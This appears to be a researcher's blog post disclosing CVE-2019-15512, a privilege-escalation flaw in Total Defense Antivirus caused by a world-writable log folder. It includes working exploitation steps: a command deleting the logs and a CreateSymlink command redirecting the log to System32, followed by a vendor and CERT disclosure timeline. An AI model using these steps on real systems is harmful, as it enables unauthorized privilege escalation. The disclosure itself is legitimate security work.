---
layout: post
title:  "CVE-2019-15512 - Total Defense Antivirus - Elevation of Privilege (Arbitrary File Creation) Vulnerability"
date:   2019-08-25 10:39:03 +0800
categories: [security, eop]
---

Overview
--------
Total Defense Common Scheduler Service creates a log file in "C:\ProgramData\TotalDefense\Consumer\ISS\9\ccschedulersvc\" by default. The file are created, accessed and manipulated by privileged (SYSTEM) processes of Total Defense. The log and folder have permissive access rights that allow unprivileged users to add/remove files and change properties. Version 9.0.0.773 are affected. Different version and product might be affected too, but untested.

Vulnerability Analysis
----------------------
Logs files are created by SYSTEM processes, and are made writeable to the Everyone group. Arbitrary file creation can be achieved by abusing the log file creation: an unprivileged user can replace these log files by pseudo-symbolic links to arbitrary files. When a log is generated, a privileged Total Defense (Scheduler Service) process will create the log file and set its access rights, offering write access to the Everyone group.

In order to achieve an arbitrary create file, an unprivileged user can:
1. Delete all files in "C:\ProgramData\TotalDefense\Consumer\ISS\9\ccschedulersvc\"
2. Create a pseudo-symlink named "C:\ProgramData\TotalDefense\Consumer\ISS\9\ccschedulersvc\ccschedulersvc.log" that points to "C:\Windows\System32\test.dll"
3. The scheduler service can be restart or wait until computer gets rebooted. Once rebooted / restarted, it will create arbitrary file on "C:\Windows\System32\" folder.

Exploitation
------------
Delete all files inside the folder:
```
Remove-Item -Force "C:\ProgramData\TotalDefense\Consumer\ISS\9\ccschedulersvc\*"
```

Using CreateSymlink tool by James Forshaw to create a symbolic link:
```
CreateSymlink.exe "C:\ProgramData\TotalDefense\Consumer\ISS\9\ccschedulersvc\ccschedulersvc.log" C:\Windows\System32\test.dll
```

Then restart the computer or the service “Total Defense Common Scheduler Service” to take effect on file creation. A successful exploitation can be achieved as in following:
![Screenshot broadcast](https://raw.githubusercontent.com/nafiez/nafiez.github.io/master/static/img/_posts/exploited.png "Screenshot broadcast")

Arbitrary file creation successful in the folder "C:\WINDOWS\SYSTEM32":
![Screenshot broadcast](https://raw.githubusercontent.com/nafiez/nafiez.github.io/master/static/img/_posts/exploited2.png "Screenshot broadcast")

**Disclosure timeline**
```
2019-04-18 - Reported to Total Defense (via email)
2019-04-18 - Vendor (Support team) ack and asked for more information of if I'm a customer. No further update from them.
2019-07-11 - Sent new email to vendor. 
2019-07-11 - Vendor ack, however still asking if I'm their customer. I told them I am not and need email of their security team / responsible team that handling vulnerability. No more feedback after that.
2019-07-25 - Create ticket to CERT.org with ticket number VU#463169. 
2019-07-29 - CERT ack that they have contact the vendor. 
2019-08-22 - CERT update, they attempt to contact vendor multiple times and no response. CERT requested me to request for CVE. 
2019-08-22 - CVE requested via normal web form.
2019-08-23 - CVE assigned, CVE-2019-15512.
```
